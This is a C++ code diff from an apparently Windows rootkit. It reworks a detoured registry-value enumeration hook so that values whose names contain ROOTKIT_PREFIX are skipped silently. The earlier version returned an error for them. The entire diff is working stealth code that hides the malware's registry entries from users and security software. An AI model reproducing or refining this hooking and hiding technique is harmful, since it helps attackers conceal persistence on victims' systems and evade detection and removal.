@@ -321,35 +321,40 @@ extern "C" NTSTATUS __declspec(dllexport) NTAPI ntevk(HANDLE key_handle, ULONG i
 	// RESTORE
 	detour::remove_detour(function_pointer, ntevk_og, sizeof(ntevk_og));
 
-	// CALL	
-	auto result = reinterpret_cast<decltype(ntevk)*>(function_pointer)(key_handle, index, key_value_class, key_value_info, length, return_length);
+	NTSTATUS result;
+	std::wstring name;
+	while (true)
+	{
+		// CALL	
+		result = reinterpret_cast<decltype(ntevk)*>(function_pointer)(key_handle, index, key_value_class, key_value_info, length, return_length);
+
+		// something failed or we reached the end of list
+		if(!NT_SUCCESS(result))
+			break;
+
+		if (key_value_class == KEY_VALUE_INFORMATION_CLASS::KeyValueFullInformation)
+		{
+			auto data = static_cast<KEY_VALUE_FULL_INFORMATION*>(key_value_info);
+			name	  = std::wstring(data->Name, data->NameLength / sizeof(wchar_t));
+		}
+		else if (key_value_class == KEY_VALUE_INFORMATION_CLASS::KeyValueBasicInformation)
+		{
+			auto data = static_cast<KEY_VALUE_BASIC_INFORMATION*>(key_value_info);
+			name 	  = std::wstring(data->Name, data->NameLength / sizeof(wchar_t));
+		}
+		else // partial information doesn't contain the name so we dont really care about it
+			break;
+
+		// if nothing is found we break out of the loop
+		if (name.find(ROOTKIT_PREFIX) == std::wstring::npos)
+			break;
+
+		// else we increase the index and check the next entry
+		++index;
+	}
 
 	// REHOOK
 	detour::hook_function(function_pointer, reinterpret_cast<uintptr_t>(ntevk));
-
-	// DON'T MODIFY ON FAILURE
-	if (result != STATUS_SUCCESS)
-		return result;
-
-	// FETCH REGISTRY KEY NAME
-	std::wstring name;
-	if (key_value_class == KEY_VALUE_INFORMATION_CLASS::KeyValueFullInformation)
-	{
-		auto data = static_cast<KEY_VALUE_FULL_INFORMATION*>(key_value_info);
-		name = std::wstring(data->Name, data->NameLength / sizeof(wchar_t));
-	}
-	else if (key_value_class == KEY_VALUE_INFORMATION_CLASS::KeyValueBasicInformation)
-	{
-		auto data = static_cast<KEY_VALUE_BASIC_INFORMATION*>(key_value_info);
-		name = std::wstring(data->Name, data->NameLength / sizeof(wchar_t));
-	}
-
-	// HIDE ANY PROTECTED ENTRIES
-	if (name.find(ROOTKIT_PREFIX) != std::wstring::npos)
-	{
-		ZeroMemory(key_value_info, *return_length);
-		return STATUS_INVALID_PARAMETER;
-	}
 
 	return result;
 }
